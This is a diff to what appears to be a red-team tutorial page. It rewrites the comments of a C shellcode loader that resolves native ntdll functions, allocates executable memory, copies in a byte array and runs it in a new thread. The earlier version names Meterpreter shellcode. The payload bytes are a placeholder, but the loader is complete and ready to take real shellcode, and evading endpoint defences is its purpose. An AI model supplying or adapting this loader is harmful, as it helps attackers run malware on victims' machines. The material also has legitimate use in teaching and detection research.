@@ -80,52 +80,50 @@ Here is the **complete code**, but you can also find it already implemented in t
 ```
 #include <stdio.h>
 #include <windows.h>
-#include <winternl.h>
 
-// Define function pointers for native API functions
+// Define typedefs for function pointers to the native API functions we'll be using.
+// These match the function signatures of the respective functions.
 typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
 typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
-typedef NTSTATUS(NTAPI* PNTCLOSE)(HANDLE);
-typedef NTSTATUS(NTAPI* PNTFREEVIRTUALMEMORY)(HANDLE, PVOID*, PSIZE_T, ULONG);
-
 
 int main() {
+    // This is placeholder shellcode. In a real use case, this would be replaced with actual shellcode
+    // that you want to inject and execute. The shellcode is stored as an array of unsigned characters.
+    unsigned char code[] = "\xfc\x48\x83";
 
-    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
-    unsigned char code[] = "\xfc\x48\x83...";
-
-    // Load native API functions from ntdll.dll
+    // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
+    // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
     PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
     PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
     PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
     PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
-    PNTCLOSE NtClose = (PNTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
-    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory = (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
 
-
-    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
-    // 'exec' will hold the base address of the allocated memory region
+    // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
+    // NtAllocateVirtualMemory is a function that reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process.
+    // 'exec' will hold the base address of the allocated memory region.
     void* exec = NULL;
     SIZE_T size = sizeof(code);
     NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-    // Copy the shellcode into the allocated memory region
+    // Copy the shellcode into the allocated memory region.
+    // NtWriteVirtualMemory is a function that writes into the virtual address space of a specified process.
     SIZE_T bytesWritten;
     NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
 
-    // Execute the shellcode in memory using a new thread
-    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
+    // Execute the shellcode in memory using a new thread.
+    // NtCreateThreadEx is a function that creates a new thread for a process.
+    // The new thread starts execution by calling the function at the start address specified in the lpStartAddress parameter. 
     HANDLE hThread;
     NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);
 
-    // Wait for the end of the thread to ensure the shellcode execution is complete
+    // Wait for the thread to finish executing.
+    // NtWaitForSingleObject is a function that waits until the specified object is in the signaled state or the time-out interval elapses.
     NtWaitForSingleObject(hThread, FALSE, NULL);
 
-    // Return 0 as the main function exit code
+    // Return 0 to indicate successful execution of the program.
     return 0;
-
 }
 ```
 </details>
